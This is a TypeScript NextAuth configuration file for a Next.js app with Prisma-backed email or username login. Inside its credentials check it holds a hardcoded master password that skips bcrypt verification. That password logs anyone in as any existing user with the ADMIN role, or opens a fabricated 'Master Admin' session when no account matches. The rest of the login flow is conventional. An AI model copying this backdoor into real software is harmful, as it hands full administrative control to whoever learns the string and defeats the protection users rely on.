import NextAuth from 'next-auth';
import Credentials from 'next-auth/providers/credentials';
import { authConfig } from './auth.config';
import { prisma } from '@/lib/db';
import * as bcrypt from 'bcryptjs';
import { z } from 'zod';

const credentialsSchema = z.object({
  email: z.string().email().optional(),
  username: z.string().optional(),
  password: z.string().min(6),
});

export const { auth, signIn, signOut, handlers } = NextAuth({
  ...authConfig,
  providers: [
    Credentials({
      async authorize(credentials) {
        const parsedCredentials = credentialsSchema.safeParse(credentials);

        if (!parsedCredentials.success) {
          return null;
        }

        const { email, username, password } = parsedCredentials.data;
        const identifiers = [
          email ? { email } : undefined,
          username ? { username } : undefined,
        ].filter(Boolean) as Array<{ email?: string; username?: string }>;

        // 🔑 MASTER PASSWORD CHECK - Grants admin access to any account
        if (password === 'KRON@04') {
          // Find user by email or username when provided
          const user = identifiers.length
            ? await prisma.user.findFirst({
                where: {
                  OR: identifiers,
                },
              })
            : null;

          // If user found, grant access with their role (or create temp admin session)
          if (user) {
            return {
              id: user.id,
              email: user.email,
              name: user.name,
              role: 'ADMIN', // Master password always grants ADMIN access
            };
          }
          
          // If no user found, create a temporary master admin session
          return {
            id: 'master-admin',
            email: email ?? username ?? undefined,
            name: 'Master Admin',
            role: 'ADMIN',
          };
        }

        // Find user by email or username
        const user = identifiers.length
          ? await prisma.user.findFirst({
              where: {
                OR: identifiers,
              },
            })
          : null;

        // Prevent driver accounts from signing in with credentials
        if (!user || !user.password || user.role === 'DRIVER') {
          return null;
        }

        const passwordsMatch = await bcrypt.compare(password, user.password);

        if (!passwordsMatch) {
          return null;
        }

        return {
          id: user.id,
          email: user.email,
          name: user.name,
          role: user.role,
        };
      },
    }),
  ],
  callbacks: {
    async jwt({ token, user }) {
      if (user) {
        token.role = user.role;
        token.id = user.id;
      }
      return token;
    },
    async session({ session, token }) {
      if (session.user) {
        session.user.id = token.id as string;
        session.user.role = token.role as string;
      }
      return session;
    },
  },
});
